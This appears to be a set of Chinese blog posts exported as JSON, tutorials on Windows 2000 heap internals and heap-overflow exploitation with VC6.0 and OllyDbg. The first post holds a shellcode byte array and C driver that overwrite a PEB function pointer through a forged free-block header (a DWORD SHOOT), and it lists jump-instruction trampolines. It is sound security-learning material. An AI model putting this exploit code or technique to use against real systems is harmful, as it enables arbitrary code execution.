那个消息框不会显示，原因是被修改的P.E.B里的函数指针不光会被ExitProcess()调用，shellcode中的函数也会使用。当shellcode的函数使用临界区时，会像ExitProcess()一样被骗。 为此，需要对shellcode进行修改，在一开始就将DWORD SHOOT的指针修复回去，以防出错。重新调试，发现0x7FFDF020处的函数指针是0x77F82060. P.E.B中RtlEnterCriticalSection()函数指针位置0x7ffdf020不会变，但是所指向的地址会变。劫持进程之后，一定要修复回劫持之前的值，否则会出现各种问题！ #include &lt;windows.h&gt; char shellcode[] = \"\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" // repaire the pointer which shooted by heap over run \"\\xB8\\x20\\xF0\\xFD\\x7F\" // MOV EAX, 7FFDF020 \"\\xBB\\x60\\x20\\xF8\\x77\" // MOV EBX, 0x77F86020 the address // may releated to your OS \"\\x89\\x18\" // MOV DWORD PTR DS:[EAX], EBX // MessageBoxA with tile \"failwest\" and context \"failwest\" \"\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C\" \"\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53\" \"\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B\" \"\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95\" \"\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59\" \"\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A\" \"\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75\" \"\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03\" \"\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB\" \"\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50\" \"\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\" \"\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00\" // head of the ajacent free block \"\\x88\\x06\\x36\\x00\\x20\\xf0\\xfd\\x7f\"; // 0x00360688 is the address of shellcode in first heap block // you have to make sure this address via debug // 0x7ffdf020 is the position in the PEB which hold a pointer to // RtlEnterCriticalSection() and will called by ExitProcess() at last int main() { HLOCAL h1=0, h2=0; HANDLE hp; hp = HeapCreate(0, 0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 200); //__asm int 3 //used to break process memcpy(h1, shellcode, 0x200); //overflow, 0x200=512 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0; } 3 堆溢出利用的注意事项3.1 调试堆与常态堆的区别使用常态堆的方法： 插入int 3中断指令（仅限于你能修改源码） 直接修改用于检测调试器的函数的返回值 3.2 在shellcode中修复环境本实验中就遇到了这种问题，在劫持进程后需要立刻修复P.E.B中的函数指针，否则会引起很多其他异常。 shellcode中的第一条指令CDF也是用来修复环境的，如果去掉，会发现shellcode自身发生内存读写异常。这是因为ExitProcess()调用时，这种特殊的上下文会把通常状态为0的DF标志 位修改为1.这会导致shellcode中的LODS DWORD PTR DS:[ESI]指令在向EAX装入第一个hash后将ESI减4，而不是通常的加4，从而在下一个函数名hash读取时发生错误。 比较简单的修复步骤： 在堆区偏移0x28的地方存放着堆区所有空闲块的总和TotalFreeSize 把一个较大块（或干脆直接找个暂时不用的区域伪造一个块首）块首中标识自身大小的两个字节（self size）修改成堆区空闲块总容量大小（TotalFreeSize） 把该块的flag位设置为0x10（last entry尾块） 把freelist[0]的前向指针和后向指针指向这个堆块 3.3 定位shellcode的跳板经常会有寄存器指向堆区离shellcode不远的地方，使用几种指令作为跳板定位shellcode。这些指令一般位于netapi32.dll、user32.dll、rpcrt4.dll中找到 CALL DWORD PTR [EDI+0X78] CALL DWORD PTR [ESI+0X4C] CALL DWORD PTR [EBP+0X74]","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"}]},{"title":"堆溢出利用（上）——DWORD SHOOT","date":"2017-06-26T02:42:20.000Z","path":"2017/06/26/堆溢出利用（上）——DWORD-SHOOT/","text":"1 堆表“拆卸”中的问题堆管理系统的三类操作：堆块分配、堆块释放和堆块合并归根结底都是对链表的修改。分配是将堆块从空表中“卸下”；释放是把堆块“链入”空表；合并也可以看做将若干个堆块先从空表中卸下，修改块首信息（大小），之后把更新后的新块“链入”空表。 “卸下”和“链入”的过程就有可能获得一次读写内存的机会。 堆溢出利用的精髓就是用精心构造的数据去溢出下一个堆块的块首，改写块首中的前向指针(flink)和后向指针(blink)，然后分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任意数据的机会。 能向内存任意地址写入任意数据的机会成为&quot;DWORD SHOOT&quot;（&quot;arbitrary DWORD reset&quot;）。其发生时，不但可以控制射击的目标(任意地址)，还可以选用适当的子弹(4字节恶意数据)。 DWORD SHOOT可以劫持进程。 点射目标(Target) 子弹(Payload) 改写的结果 栈帧中的函数返回地址 shellcode起始地址 函数返回时，跳去执行shellcode 栈帧中的S.E.H句柄 shellcode起始地址 异常发生时，跳去执行shellcode 重要函数调用地址 shellcode起始地址 函数调用时,跳去执行shellcode 2 DWORD SHOOT 举例这里举的是将一个结点从双向链表中“卸下”时可能发生的问题: int remove(ListNode *node) { node-&gt;blink-&gt;flink = node-&gt;flink; node-&gt;flink-&gt;blink = node-&gt;blink; return 0; } 通过这个函数逻辑，得到下图缩水的链表变化过程。 当堆溢出发生时，非法数据会淹没下一个堆块块首。即块首中存放的前向指针和后向指针可以被攻击者伪造，当这个堆块从双向链表中卸下时，node-&gt;blink-&gt;flink=node-&gt;flink将把伪造的flink指针值写入伪造的blink所指向的地址中去，从而发生DWORD SHOOT。 3 调试中体会DWORD SHOOT代码如下: #include &lt;windows.h&gt; int main() { HLOCAL h1,h2,h3,h4,h5,h6; HANDLE hp; hp = HeapCreate(0, 0x1000, 0x10000); h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h5 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h6 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); __asm int 3 // used to break the process //free the odd blocks to prevent coalesing HeapFree(hp, 0, h1); HeapFree(hp, 0, h3); HeapFree(hp, 0, h5); //now freelist[2] got 3 entries //will allocate from freelist[2] which means unlink the last entry(h5) h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); return 0; } (1) 程序首先创建了一个大小为0x1000的堆区，并从其中连续申请了6个大小为8字节的堆块（加上堆首就是16字节），这应该会从大块上切下来。(2) 释放奇数次申请的堆块为了防止堆块合并的发生。(3) 三次释放结束后，freelist[2]所标识的空表中应该链入了3个空闲链表，它们一次是h1、h3、h5。(4) 再次申请8字节的堆块，应该从freelist[2]所标识的空表中分配，这意味着最后一个堆块h5被从空表中拆下。(5) 如果我们手动修改h5块首中的指针，应该能够观察到DWORD SHOOT的发生。 将代码执行到0x0040112E处，此时三次内存释放操作结束。此时堆块状况如下：空表索引堆块状况 从0x0040112E处开始，共有7个堆块，如表所示： 堆块使用状况 起始位置 Flag Size 单位:8bytes 前向指针 后向指针 h1 0x00360680 空闲态0x00 0x0002 0x003606A8 0x00360188 h2 0x00360690 占用态0x01 0x0002 无 无 h3 0x003606A0 空闲态0x00 0x0002 0x003606C8 0x00360688 h4 0x003606B0 占用态0x01 0x0002 无 无 h5 0x003606C0 空闲态0x00 0x0002 0x00360188 0x003606A8 h6 0x003606D0 占用态0x01 0x0002 无 无 尾块 0x003606E0 最后一项0x10 0x0124 0x00360178(freelist[0]) 0x00360178(freelist[0]) 除了freelist[0]和freelist[2]之外，所有的空表索引都为空（指向自身）。结合上面给出的空表索引图，我们可以得到freelist[2]链表的组织情况。如图所示： 在执行最后一次8字节的内存请求时会把freelist[2]的最后一项（原来的h5）分配出去，这意味着将最后一个结点从双向链表中卸下。 如果直接修改在内存中h5堆块中的空表指针（当然攻击发生时是由于溢出改写的），那么应该能够观察到DWORD SHOOT现象。 如图所示，直接在调试器中手动将0x003606C8处的前向指针改为0x44444444,后向指针改为0x00000000。当最后一个分配函数被调用后，调试器被异常中断，原因是无法将0x44444444写入0x00000000.当然，如果把射击目标定位合法地址，这条指令执行后 0x44444444将会被写入目标。 4 说明事实上，堆块的分配、释放、合并等操作都能引发DWORD SHOOT(因为都涉及链表操作)，甚至快表也可以用来制造DWORD SHOOT。","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"}]},{"title":"堆溢出研究试验","date":"2017-06-24T07:43:07.000Z","path":"2017/06/24/堆溢出研究试验/","text":"1. 环境准备针对堆进行调试，我整整花了3天时间，中间多次想不再进行调试！开始觉得还没怎么调试就结束，这不太好...中间觉得离最终能够调试已经很近了，加油...最后觉得已经到了这一步了，放弃就怪可惜的哎！人就是这样矛盾的生物 话归正传，我们来看看调试所需要的环境 软件 备注 Windows 2000虚拟机 无论你用的VMware，亦或是Virtualbox，请确保windows 2000能够正常复制粘贴，很多朋友都是在此处浪费了大量时间，我也不例外 VC6.0 无论是纯净版还是绿色版，只要能用即可！注意在调试程序的时候勾选：工具-&gt;选项-&gt;调试中的实时调试 ；而且还应该调成Release版本：组建(Build)-&gt;移除工程配置，双击other - Win32 Release Ollydbg 建议大家使用Ollydbg110版本，因为我此版本测试通过！而吾爱破解专用版Ollydbg无法正常使用，大家切忌使用此版本，否则十分坑爹！启动od，然后点击option-&gt;just-in-time debugging选中Make ollydbg Just-in-time debugger并确认，最后重启od 2. 堆的数据结构2.1 堆块1） 堆块分为块首和块身块首是堆块头部的几个字节，用来标识这个堆块自身的信息，包括本块的大小、本块空闲还是占用等信息；块身紧跟在块首后面的部分，是最终分配给用户使用的数据区。 2） 块首大小为（8字节） 3） 空闲态的堆块在块首后有两个指针 2.2 堆表（空表和快表）位于堆区的起始位置，用于索引堆区中堆块的重要信息。堆表的数据结构决定了整个堆区的组织方式。堆表在设计时可能会考虑采用平衡二叉树等高级数据结构用于优化查找效率。现代操作系统的堆表往往不止一种数据结构。 在windows中，占用态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。 1） 空表：双向回环链表(Freelist)堆区一开始的堆表区中有一个128项的指针数组（看到有人说把它看成队列的），被称作空表索引。该数组的每一项包含两个指针，用于表示一条空表。free[1] 标识了所有堆中所有大小为8字节的空闲堆块，之后每个索引指示的空闲堆块递增8个字节。即：free[2]标识了16个字节的空闲堆块。free[k] 标识了 k * 8 个字节的空闲堆块。指示第1项空表索引比较特殊，从图中我们也可以看到：这条双向链表链入了所有大于等于1024字节的堆块（小于512KB），堆块按照升序排列。 2） 快表：单向链表(Lookaside)快速单项链表是Windows用来加速堆块分配而采用的一种堆表。这类单项链表不会发生堆块合并（其中的空闲块块首会被设置为占用态，用来防止堆块合并）。 快速单项链表有128条，组织结构与空闲双向链表类似，只是其中的堆块按照单项链表组织。快表总是被初始化为空，而且每条快表最多只有4个结点，故很快就会被填满。 3） 区别a) 以上两个都为128大小的指针数组 （空表每一项有两个指针，快表每一项有一个指针）b) 快表最多只有四个节点c) 空表除了数组的第一个元素外其他分别链接：数组下标*8 大小的堆块，数组的第一个元素链接着大于1kb的堆块，并升序排序d) 快表的堆块处于占用状态，不会发生堆块合并e) 快表的只存在精确分配，快表优先空表分配 2.3 内存块小块（小于1kb）分配方式：优先快表，其次空表非零元素（free[0]），然后堆缓存，最后空表零元素。否则就紧缩，然后再尝试。再否则就返回NULL释放：优先链入快表（只能链入4个空闲块），如果快表满则链入相应的空表 大块（大于1kb小于512kb）分配方式：优先堆缓存，其次空表零元素释放： 优先放入堆缓存，若堆缓存满则链入freelist[0] 巨块（大于512kb）分配方式：虚分配释放：直接释放 3 堆结构的验证和分析在堆中进行内存分配的时候，C语言函数调用的是malloc()函数，c++中调用new()函数，当动态调试进入函数内部的时候察觉此两个函数调用的都是底层ntdll.dll中的RtAllocateHeap()函数，所有的windows分配堆的函数在底层调用的都是此函数，这也死程序员可以看到的关于堆的最底层函数。因此研究堆分配，重点关注此函数即可。 3.1 堆的调试在此之前需要理解一个概念：调试堆与调试栈不同，不能直接加载或者attach 程序，否则堆管理策略就会采用调试状态下的堆管理策略，使用调试状态下的堆管理函数。 正常堆和调试堆的区别：1.调试堆只采用空表分配，不采用快表分配2.所有的堆块末尾都加上十六个字节的用来防止程序溢出，（仅仅是用来防止程序溢出，而不是堆溢出），其中这十六个字节包括：8个字节的0xAB 和 8个字节的0x003.块首的标志标志位不同，调试状态下的堆和正常堆的区别如同debug下的PE文件和release下的PE文件类似，做堆移除实验的时候，调试器中可以v正常运行的shellcode，单独运行却不行。很可能就是调试堆与正常堆的差异造成的。 为拉避免采用调试状态下的堆，我i们直接在程序中嵌入 int3 断点，然后调用实时调试器即可 3.2 空表结构验证调试3.2.1 验证代码#include &lt;windows.h&gt; int main() { HLOCAL h1,h2,h3,h4,h5,h6; HANDLE hp; hp = HeapCreate(0, 0x1000, 0x10000); //堆创建 __asm int 3; h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 3); //申请内存 h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 5); h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 6); h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h5 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 19); h6 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24); //free block and prevent coaleses //释放掉1、3、5,内存不相联不会发生堆块合并 HeapFree(hp, 0 , h1); // free to freelist[2] HeapFree(hp, 0 , h3); // free to freelist[2] HeapFree(hp, 0 , h5); // free to freelist[4] //内存相联，合并 HeapFree(hp, 0 , h4); // coalese h3, h4, h5, link the large block to freelist[8] return 0; } 3.2.2 堆调试环境配置 在VC6.0中创建该工程，然后勾选：工具-&gt;选项-&gt;调试中的实时调试，并将运行结果设置为Release版本 在OllyDbg中&quot;Options&quot;菜单中选中&quot;Just-in-time debugging&quot;，单击&quot;Make OllyDbg just-in-time debugger&quot;，然后单击&quot;Done&quot;按钮确认。 运行上面程序之后，在系统出现错误提示的时候，选择&quot;取消&quot; 然后可以在Ollydbg中进行调试，使用Alt+M可以查看当前内存映射状态，如图所示 3.2.3 实验过程可以看出程序断点断在了VA=0x0040101D处，此时内存映射窗口也在上图中显示。其实你应该知道：进程堆地址为0x130000, S大小为0x6000。可以使用GetProcessHeap()获取函数句柄。 其实本实验中的内存分配函数malloc()有属于自己的堆区（0x00340000，大小0x2000）. 识别堆表在程序初始化的过程中，malloc使用的堆和进程堆都已经经过了若干次分配和释放操作，里面的堆块相对比较“凌乱”，因此我们在程序中使用HeapCreate()函数创建一个新的堆，通过调试这个比较“整齐”的堆来理解堆管理。 当HeapCreate()成功创建了堆区之后，会把整个堆区的起始地址返回给EAX，如上上图所示，地址为0x00360000在内存映射窗口双击0x00360000地址所在行即可进入数据窗口。从0x00360000开始，堆表中包含的信息依次是段表索引（Segment List）、虚表索引（Virtual Allocation list）、空表使用标识（freelist usage bitmap）和空表索引区 当然，上面给出的区域并不完整，下面是我从网上找到的完整表述： 0:000> dt _HEAP 00080000 +0x000 Entry : _HEAP_ENTRY +0x008 Signature : 0xeeffeeff +0x00c Flags : 0x50000062 +0x010 ForceFlags : 0x40000060 +0x014 VirtualMemoryThreshold : 0xfe00 +0x018 SegmentReserve : 0x100000 +0x01c SegmentCommit : 0x2000 +0x020 DeCommitFreeBlockThreshold : 0x200 +0x024 DeCommitTotalFreeThreshold : 0x2000 +0x028 TotalFreeSize : 0xcb +0x02c MaximumAllocationSize : 0x7ffdefff +0x030 ProcessHeapsListIndex : 1 +0x032 HeaderValidateLength : 0x608 +0x034 HeaderValidateCopy : (null) +0x038 NextAvailableTagIndex : 0 +0x03a MaximumTagIndex : 0 +0x03c TagEntries : (null) +0x040 UCRSegments : (null) +0x044 UnusedUnCommittedRanges : 0x00080598 _HEAP_UNCOMMMTTED_RANGE +0x048 AlignRound : 0x17 +0x04c AlignMask : 0xfffffff8 +0x050 VirtualAllocdBlocks : _LIST_ENTRY [ 0x80050 - 0x80050 ] +0x058 Segments : [64] 0x00080640 _HEAP_SEGMENT +0x158 u : __unnamed +0x168 u2 : __unnamed +0x16a AllocatorBackTraceIndex : 0 +0x16c NonDedicatedListLength : 1 +0x170 LargeBlocksIndex : (null) +0x174 PseudoTagEntries : (null) +0x178 FreeLists : [128] _LIST_ENTRY [ 0x829b0 - 0x829b0 ] +0x578 LockVariable : 0x00080608 _HEAP_LOCK +0x57c CommitRoutine : (null) +0x580 FrontEndHeap : 0x00080688 +0x584 FrontHeapLockCount : 0 +0x586 FrontEndHeapType : 0x1 '' +0x587 LastSegmentIndex : 0 '' 可以明显看出，空表开始位置在0x00360178处，其余的堆块一般与溢出利用关系不大。当一个堆刚刚被初始化时，它的堆块状况是非常简单的： 只有一个空闲态的大块(称为“尾块”) 偏移0x178的位置是空表的头，可以参见介绍空表时所用的图。如图可以看到，当前的freelist[0]的值是0x00360688，而其他元素都指向自身(蓝框指向0x00360688,红框指向自身地址)。（启用块表后0x688位置就是快表） Freelist[0]指向“尾块”，八个字节（前四个字节是前向指针，后四个字节时后巷指针，即：空表的一对指针），其余各项指向本身 除零号空表索引外，其余各项索引都指向自己，这意味着其余所有的空闲链表都没有空闲块。 占用态空闲态 占用态和空闲态的共同点 0-2 字节代表本快的大小（包括块首）2-4字节表示计算单位是多少字节 占用态与空闲态的不同点 Flags出 占用态标志是1 空闲态标志是 0 空闲态块首后的八个字节为一对指针，分别是前向指针和后向指针。当堆块变为占用态的时候重新回分配数据。 实际上尾块的起始位置是 0x360680， 一般引用堆块的指针都会跃过8字节的块首，直接指向数据区 因此根据地址 0x360680处八个字节的情况(参见下图)可以知道：此尾块的大小是 0x130 计算单位是 0x0008 个字节 总大小是 0x980字节 (0x130 * 0x8 = 0x980)。 注意：堆块的大小是包含块首在内的 堆块的分配上面也讲了，堆块在分配的时候会将块首计算在内。所以程序中的费喷情况如下： 堆句柄 请求字节数 实际需要的字节数 实际分配（堆单位） 实际分配（字节） H1 3 11 2 16 H2 5 13 2 16 H3 6 14 2 16 H4 8 16 2 16 H5 19 27 4 32 H6 24 32 4 32 直接在CPU窗口，命令F8单步执行程序到地址:0x0040102B处，这时我们执行完了h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 3)当h1被分配以后直接查看地址：0x00360178地址处的值（0x00360698）：此时的地址0x360178处的值已经从0x360688改变为0x360698 同时跳转到 0x360698,如下图：从图中可以看出：分配给h1的大小为0x0002, size=16bytes 接下来运行到地址0x00401059，此时h1~h6全部分配完，查看0x00360178的地址可以看出，值已经更改为0x00360708。接下来到0x00360680处进行查看 h1~h6的分配情况如下： 如上所示，现在的地址是：0x360700大小是0x120 = 0x130 - 0x2 * 4 - 0x4 * 2 以上从h1 - h6的分配情况验证啦 空表分配中的找零钱现象（从一个大块中依次一小块一小块地进行切割） 下面是我的一些思考：首先，尾块上的指针指向什么？其实尾块上的指针表示的是没有分配完的区间有多大。因此如果要查看指针所指向的内容，应该找其Self Size中的内容。例如上图中的0x700是尾块，那么h6中的data实际上应该是0x6E0~0x700。以此类推，可以找到h5，h4，h3，h2，h1中的数据雷荣。h1的堆块为0x680~0x690。 堆块的释放接着上面的程序执行，直接执行到地址：00401077地址处HeapFree(hp,0,h1); //free to freelist[2]HeapFree(hp,0,h3); //free to freelist[2]HeapFree(hp,0,h5); //free to freelist[4]分别释放啦堆块 h1 h3 h5这样做是防止相邻堆块进行堆块的合并。直接查看地址 0x360178地址处的值重点观察变化的值如下图： 从上图中可以发现地址 0x360188 的值发生啦变化 从原来的指向自身现在变为指向：0x360688 0x3608A8 地址0x360198处的值变化为： 0x003606C8 和 0x003606c8 由上图可知 h1 h3分别被释放到 freelist[2] 空表中， h5被释放到啦 freelist[4]空表中。 根据freelist【2】 的空表索引 以及h1 h3堆块的指针组，可以发现 ：如图所示左边箭头是前向指针，顺序为 Freelist -&gt; h1 &gt; h3 右边是后向指针 顺序是 h3&gt; h1 &gt; freelist[2] 对于h5堆块倒是没啥 ，freelist[5]直接索引到 地址 0x3606c8 堆块的合并接着程序运行直接运行到地址 0x401080地址处，执行的是代码： HeapFree(hp,0,h4); //coalese h3,h4,h5,link the large block to freelist[8] 当释放h4的时候会发生堆块的合并现象（两个连续的空闲块就会发生合并）。首先是先从空表中将三个空闲块摘下，重新计算合并后的堆块的大小，然后合并成新的空闲块，链入空表。如下图所示分别为空表索引区状态和合并后堆块状态： 如上图所所示： 在0x188处的freelist[2]，原来标识的空表中有两个空闲块h1和h3，而现在只有一个h1，因为h3在合并时被摘下了。同理0x198处的freelist[4]也被摘下了。 在0x1B8处的freelist[8]，原来指向自身，现在指向合并后的新空闲块0x3606A8，处的值 0x0008 即是：合并后的堆块的大小。后八个字节的指针对，则指向空表的索引区。 注意事项 以上是空表中的堆块的合并，并且只发生在空表中。 整个过程比较费时，繁琐，在强调效率的情况下，堆块合并就会被禁止，设置为占用太。 空表中第一个块的情况下不会向前发生合并，最后一个块不会向后进行合并。 3.3 快表结构验证调试3.3.1 验证代码#include &lt;stdio.h&gt; #include &lt;windows.h&gt; void main() { HLOCAL h1,h2,h3,h4; HANDLE hp; hp = HeapCreate(0, 0, 0); __asm int 3 h1 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 8); h3 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16); h4 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 24); HeapFree(hp, 0, h1); HeapFree(hp, 0, h2); HeapFree(hp, 0, h3); HeapFree(hp, 0, h4); h2 = HeapAlloc(hp, HEAP_ZERO_MEMORY, 16); HeapFree(hp, 0, h2); } 3.3.2 实验过程首先在dump窗口中直接跳转至0x360178处，此处是快表地址，发现地址指向0x00361E90，不是原来的0x00360688。此时基本上可以看出有快表！直接在dump窗口中进行跳转到0x360688处，此时发现快表为空。这也是为什么要反复申请释放内存的原因。首先从FreeList[0]中依次申请8，8，16，24字节的内存，然后进行释放到快表中（快表未满时释放到快表中）。根据三个堆块的大小我们可以知道8字节的会被释放到Lookaside[1]中、16字节的会被释放到Lookaside[2]中、24字节的会被释放到Lookaside[3]中。 先运行程序到地址 0x40109F处。此时直接观察快表中的变化，此时发现仍然为空，下面运行释放程序，直接单步执行命令运行到地址：0x401106处，这是观察快表的变化如图所示： 运行程序到地址 0x40110D处观察堆块是否链如快表： 如上图所示h1 - h4已经链接进入块表中并且都是处于占用态。 地址 0x361e90指向下一个堆块（因为h1 h2 同时为八字节的空闲堆块） 当程序运行到地址 0x40111D时（也就是执行完申请内存的代码时）h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,16);此时申请的堆块应该从块表中申请，此时查看堆表区的索引：从以上两图中可以看到当继续申请内存的时候，是从快表lookside[2]处卸下的堆块。 当释放的时候，代码执行到0x401140,还是将空闲堆块释放到此处执行代码：HeapFree(hp,0,h2);执行完后继续查看上图中地址的值：如图所示：当释放完堆块后还是链接进入啦快表 looksize[2] 3.4 快表中堆块与空表中堆块区别 块首中的标志位为0x01，也就是这个堆块是Busy状态，这也是为什么快表中的堆块不进行合并操作的原因。 块首只存指向下一堆块的指针，不存在指向前一堆块的指针。 参考文献堆溢出研究二堆溢出（一）堆结构!HeapAdvanced Windows Debugging: Memory Corruption Part II—HeapsReliable Windows Heap Exploits BY SHOK","tags":[{"name":"heap","slug":"heap","permalink":"http://yoursite.com/tags/heap/"},{"name":"调试","slug":"调试","permalink":"http://yoursite.com/tags/调试/"}]},{"title":"VC6.0进行软件断点调试","date":"2017-06-24T02:42:36.000Z","path":"2017/06/24/VC6-0进行软件断点调试/","text":"开始之前VC6.0进行断点调试的时候，系统经常会提示应用程序错误，然后调试过程直接结束。所以我们急需解决vc6.0软件断点调试的解决办法。VC中的Just-in-time调试,使用该调试模式应用程序可以在Visual C++开发环境之外运行知道发生一个错误.当遇到一个程序错误时,Just-in-time调试自动加载Visual C++ Debugger。打开Just-in-time调试：修改Tools-&gt;Options-&gt;Debugging，选中Just-in-time debugging选项即可。(其实该选项所做的操作就是写了个注册表,将自己作为其他程序抛出异常时的处理程序,下面有介绍) 设置即时调试断点，在编译生成的Debug版本程序中加入断点异常，在代码中硬编码一个断点(相当于让程序出错)，让程序在到达程序员希望停止位置时加载已经打开源码的Debugger实现对该位置的调试。(当然没有源码也可以调试的，如果想调试汇编的话.) VC中的即时调试断点设置方法:DbgBreakPoint 或者 DebugBreak C#中的即时调试断点设置方法:Debugger.Break js中的即时调试断点设置方法:Debugger ASP(VBS)中的即时调试断点设置方法:Stop ###VC6.0调试 断点中断程序的执行(断点指令) 断点指令那么我们就来说说什么是断点，断点是什么？不是F9 ，也不是那个小红球，在Intel系列的CPU（包括AMD生产的CPU）里面，它其实是一个特殊的指令：INT 3。CPU在执行程序的指令集的时候，只要碰到这个指令，就会中断程序的执行。 引用的示例当然我们需要用事实来证明我上面的话，因此把下面的程序编译并且执行一下，点“Yes”，点“Break”，程序就中断了.以下为引用内容： #include &lt;stdio.h&gt; void main() { printf(&quot;Before breakpoint&quot;n&quot;); __asm { int 3 } printf(&quot;Before breakpoint&quot;n&quot;); } 断点是int 3这个指令触发的。 由int 3这个指令（当然是在intel系列的CPU上面）引申出来的函数 ： 语言/工具 名称 描述 C++ DebugBreak 在C++代码中硬编码一个断点。 C# Debugger.Break 在.NET代码中硬编码一个断点 Visual Studio 断点 设置一个断点 摘抄随时将调试程序连接到任何进程的能力称为即时调试（Just-in-timeDebugging）。 这里我们对它如何工作稍加说明：当程序员点击Cancel按钮，就是告诉UnhandledExceptionFilter函数对进程进行调试。在内部，UnhandledExceptionFilter调用调试程序，这需要查看下面的注册表子关键字： HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/AeDebug在这个子关键字里，有一个名为Debugger的数值，在安装VisualStudio时被设置成下面的值：&quot;C:/Program Files/Microsoft Visual Studio/Common/MSDev98/Bin/msdev.exe&quot; -p %ld -e %ld在Windows98中，这些值不是存放在注册表中，而是存放在Win.ini文件中。这一行代码是告诉系统要将哪一个程序（这里是MSDev.exe）作为调试程序运行。当然也可以选择其他调试程序。 UnhandledExceptionFilter还在这个命令行中向调试程序传递两个参数。第一个参数是被调试进程的ID。第二个参数规定一个可继承的 手工复位事件，这个事件是由UnhandledExceptionFilter按无信号状态建立的。厂商必须实现他们的调试程序，这样才能认识指定进程 ID和事件句柄的-p和-e选项。在进程ID和事件句柄都合并到这个串中之后，UnhandledExceptionFilter通过调用 CreateProcess来执行调试程序。这时，调试程序进程开始运行并检查它的命令行参数。如果存在-p选项，调试程序取得进程ID，并通过调用 DebugActiveProcess将自身挂接在该进程上。BOOL DebugActiveProcess(DWORD dwProcessID);一旦调试程序完成自身的挂接，操作系统将被调试者（debuggee）的状态通报给调试程序。在调试程序完全初始化之后，它要再检查它的命令行，找-e选项。如果该选项存在，调试程序取得相应的事件句柄并调用SetEvent。调试程序可以直接使用事件的句柄值，因为事件句柄具有创建的可继承性，并且被调试进程对UnhandledExceptionFilter函数的调用也使调试程序进程成为一个子进程。 设定这个事件将唤醒被调试进程的线程。被唤醒的线程将有关未处理异常的信息传递给调试程序。调试程序接收这些通知并加载相应的源代码文件，再将自身放在引发异常的指令位置上。还有，不必在调试进程之前等待异常的出现。可以随时将一个调试程序连接在任何进程上，只需运行“MSDEV-pPID”，其中PID是要调试的进程的ID。 实际上，利用Windows2000 TaskManager，做这些事很容易。当观察Process标记栏时，可以选择一个进程，点击鼠标右键，并选择Debug菜单选项。这将引起 TaskManager去查看前面讨论过的注册表子关键字，调用CreateProcess，并传递所选定的进程的ID作为参数。在这里，TaskManager为事件句柄传送0值。 参考文献本文转自即时调试（Just-in-timeDebugging） Visual Studio调试 断点中断程序的执行(断点指令)","tags":[{"name":"windows","slug":"windows","permalink":"http://yoursite.com/tags/windows/"},{"name":"调试","slug":"调试","permalink":"http://yoursite.com/tags/调试/"}]},{"title":"HeapCreate()","date":"2017-06-23T05:23:37.000Z","path":"2017/06/23/HeapCreate/","text":"HeapCreate这个函数创建一个只有调用进程才能访问的私有堆。进程从虚拟地址空间里保留出一个连续的块并且为这个块特定的初始部分分配物理空间。 HANDLE HeapCreate(DWORD flOptions , DWORD dwInitialSize , DWORD dwMaxmumSize); 参数flOptions：堆的可选属性。这些标记影响以后对这个堆的函数操作，函数有：HeapAlloc , HeapFree , HeapReAlloc , HeapSize 